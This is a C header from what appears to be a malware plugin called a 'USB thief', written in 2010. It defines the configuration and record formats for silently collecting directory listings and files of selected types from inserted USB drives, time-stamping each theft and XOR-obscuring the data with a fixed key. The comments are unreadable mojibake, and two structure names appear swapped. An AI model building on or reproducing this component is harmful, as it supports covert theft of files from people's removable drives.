/*++ Build Version 0.9

Module Name:

	T5UsbConfig.h

Abstract:

	���ݽṹ����������ʲô��

UpdateTime:
	
	24 - 07 - 2010

Revision History:

	0.6 Release 13 - 07 - 2010
	0.7 Release 21 - 07 - 2010
	0.8 Release 23 - 07 - 2010
	0.9 Release 24 - 07 - 2010

--*/

#ifndef _TJ_T5_ZY_USBCONFIG_H
#define _TJ_T5_ZY_USBCONFIG_H

// 
//	USB �洢���ļ�����
#define USB_MAGIC			0x00757342
#define USB_THIEF_VERSION	0x00000009
#define USB_FILE_FILE		0x00000020
#define USB_FILE_DIR		0x00000010
#define USB_FILE_STL		0x00000030
#define	USB_FILE_RTB		0x00000040
#define USB_FILE_USB		0x00000050

//
//	��������
#define USB_CRYPT_XOR		0x80000001		//�������࣬���

//
//	����KEY
#define USB_CRYPT_XOR_KEY	'A'

//
//	Ŀ¼��־�ļ��Ľṹ :	1. ����ͷ	USB_COMMON_HEADER
//							2. U����Ϣ	FLASH_DISK_INFO
//							3. Ŀ¼����	USB_DIR
//

#pragma pack( push )
#pragma pack(1)
//
//	u�������ļ�
typedef struct _USB_THIEF_CONFIG
{
	DWORD	dwSize;					//�ṹ��С		
	BOOL	bGetFile;				//�Ƿ��ȡĿ¼
	BOOL	bGetDir;				//�Ƿ�ȡ�ļ�
	DWORD	dwFilterSize;			//����ȡ�ļ���С
	DWORD	dwSizeOfType;			//��ȡ�ļ������ַ����Ĵ�С
	WCHAR	wzFilterType[1];		//��ȡ���ļ����ͣ���ʽΪ: *.ppt;

}USB_THIEF_CONFIG, *PUSB_THIEF_CONFIG;

//
//	����ͷ
typedef struct _USB_COMMON_HEADER
{
	DWORD	dwSize;
	DWORD	dwPluginId;
	DWORD	dwPluginVersion;
	DWORD	dwMagic;
	DWORD	dwFileType;			// �ļ�����
} USB_COMMON_HEADER, *PUSB_COMMON_HEADER;

//
//	U����Ϣ
typedef struct _FLASH_DISK_INFO
{
	DWORD	dwSize;
	WCHAR	wzVolume[MAX_PATH];
	WCHAR	wzFileSystem[32];
	DWORD	dwFlashDiskId;

	FILETIME	ftInsertTime;
	FILETIME	ftRemoveTime;
}FLASH_DISK_INFO_MAC, *PFLASH_DISK_INFO_MAC;

typedef struct _FLASH_DISK_INFO_MAC
{
	DWORD	dwSize;
	WCHAR	wzVolume[8];
	WCHAR	wzFileSystem[32];
	DWORD	dwFlashDiskId;

	FILETIME	ftInsertTime;
	FILETIME	ftRemoveTime;
}FLASH_DISK_INFO, *PFLASH_DISK_INFO;

//
//	U��Ŀ¼�ļ��ṹ
typedef	struct	_USB_DIR
{
	DWORD	dwLevel;			//	Ŀ¼����

	DWORD	dwBasedDirPathLen;	//	����Ŀ¼����
	PBYTE   lpBasedDirPath;		//	����Ŀ¼

	DWORD	dwDirDataLen;		//	��Ŀ¼�����ݵĳ���
	PBYTE	lpbyDirData;		//	��Ŀ¼�е�����

	struct _USB_DIR *lpNext;
}USB_DIR, *PUSB_DIR;

//
//	�ļ�����
typedef	struct	_USB_FILE_DATA
{
	DWORD		dwSize;				//	�ṹ��С

	CHAR		szKey;				//	���
	DWORD		dwEncrytType;		//	��������

	//
	//	�ļ����������ʡ����һ�ζ�д��ȡ�ļ���ʱ��
	FILETIME	ftCreation;			
	FILETIME	ftAccess;
	FILETIME	ftLastWrite;
	FILETIME	ftThief;

	DWORD		dwSizeOfFile;		//	�ļ���С
	DWORD		dwSizeOfFilePath;	//	U���ļ�·����С
	WCHAR		wzUsbFilePath[1];	//	U���ļ�·������Ҫ���
    		
}USB_FILE_DATA, *PUSB_FILE_DATA;

#pragma pack( pop )

#endif